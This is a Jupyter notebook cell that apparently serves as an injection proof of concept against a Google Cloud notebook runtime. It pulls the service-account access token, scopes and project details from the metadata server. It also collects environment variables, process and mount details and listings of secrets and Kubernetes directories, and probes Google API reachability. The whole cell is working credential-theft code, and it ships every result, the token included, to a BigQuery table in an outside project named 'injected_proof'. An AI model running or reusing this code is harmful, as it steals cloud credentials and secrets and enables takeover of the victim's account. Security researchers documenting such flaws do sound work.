In [ ]:
import os, json, socket, urllib.request, urllib.error, subprocess
from google.cloud import bigquery

def safe(label, fn):
    try:
        v = fn()
        return {'label': label, 'ok': True, 'value': str(v)[:2000]}
    except Exception as e:
        return {'label': label, 'ok': False, 'value': f'ERR: {type(e).__name__}: {str(e)[:500]}'}

def metadata(path):
    req = urllib.request.Request(f'http://169.254.169.254/computeMetadata/v1/{path}', headers={'Metadata-Flavor': 'Google'})
    return urllib.request.urlopen(req, timeout=5).read().decode()

def http_probe(url):
    try:
        return urllib.request.urlopen(url, timeout=3).status
    except urllib.error.HTTPError as e:
        return f'HTTP {e.code}'
    except Exception as e:
        return f'ERR: {type(e).__name__}: {str(e)[:100]}'

probes = []

# Identity
probes.append(safe('whoami', lambda: subprocess.check_output(['whoami']).decode().strip()))
probes.append(safe('uid', lambda: os.getuid()))
probes.append(safe('hostname', lambda: socket.gethostname()))
probes.append(safe('uname', lambda: subprocess.check_output(['uname','-a']).decode().strip()))

# Metadata server (most important)
probes.append(safe('meta_default_email', lambda: metadata('instance/service-accounts/default/email')))
probes.append(safe('meta_default_scopes', lambda: metadata('instance/service-accounts/default/scopes')))
probes.append(safe('meta_default_token', lambda: metadata('instance/service-accounts/default/token')))
probes.append(safe('meta_project_id', lambda: metadata('project/project-id')))
probes.append(safe('meta_project_num', lambda: metadata('project/numeric-project-id')))
probes.append(safe('meta_instance_id', lambda: metadata('instance/id')))
probes.append(safe('meta_instance_name', lambda: metadata('instance/name')))
probes.append(safe('meta_zone', lambda: metadata('instance/zone')))
probes.append(safe('meta_machine_type', lambda: metadata('instance/machine-type')))
probes.append(safe('meta_attributes', lambda: metadata('instance/attributes/')))
probes.append(safe('meta_tags', lambda: metadata('instance/tags')))
probes.append(safe('meta_network_ip', lambda: metadata('instance/network-interfaces/0/ip')))
probes.append(safe('meta_all_sas', lambda: metadata('instance/service-accounts/')))

# Container introspection
probes.append(safe('proc_1_cmdline', lambda: open('/proc/1/cmdline','rb').read().decode().replace('\x00',' ')[:500]))
probes.append(safe('proc_self_cmdline', lambda: open('/proc/self/cmdline','rb').read().decode().replace('\x00',' ')[:500]))
probes.append(safe('env_vars', lambda: json.dumps({k: v[:200] for k,v in os.environ.items() if not k.startswith('PWD')})))
probes.append(safe('proc_self_status', lambda: open('/proc/self/status').read()[:1500]))
probes.append(safe('proc_self_maps_head', lambda: open('/proc/self/maps').read()[:1500]))

# Network reachability
for url in ['http://169.254.169.254/', 'http://metadata.google.internal/', 
            'https://storage.googleapis.com/', 'https://aiplatform.googleapis.com/',
            'https://dataform.googleapis.com/', 'https://bigquery.googleapis.com/',
            'https://run.googleapis.com/', 'https://secretmanager.googleapis.com/']:
    probes.append(safe(f'reach_{url[:50]}', lambda u=url: http_probe(u)))

# Filesystem inspection
probes.append(safe('ls_root', lambda: subprocess.check_output(['ls','-la','/']).decode()[:1500]))
probes.append(safe('ls_var_run_secrets', lambda: subprocess.check_output(['ls','-laR','/var/run/secrets'], stderr=subprocess.STDOUT).decode()[:2000]))
probes.append(safe('ls_etc_kubernetes', lambda: subprocess.check_output(['ls','-la','/etc/kubernetes'], stderr=subprocess.STDOUT).decode()[:1000]))
probes.append(safe('mounts', lambda: open('/proc/self/mounts').read()[:2000]))
probes.append(safe('cgroup', lambda: open('/proc/self/cgroup').read()[:500]))
probes.append(safe('hostname_file', lambda: open('/etc/hostname').read().strip()))

# Write all results to BigQuery
client = bigquery.Client(project='bq-ssrf-453453')
rows = [{'label': p['label'], 'ok': p['ok'], 'value': p['value']} for p in probes]
table_id = 'bq-ssrf-453453.injected_proof.NOTEBOOK_RUNTIME_PROBE'
schema = [bigquery.SchemaField('label','STRING'), bigquery.SchemaField('ok','BOOL'), bigquery.SchemaField('value','STRING')]
client.create_table(bigquery.Table(table_id, schema=schema), exists_ok=True)
errs = client.insert_rows_json(table_id, rows)
print('Inserted', len(rows), 'rows', 'errors:', errs)
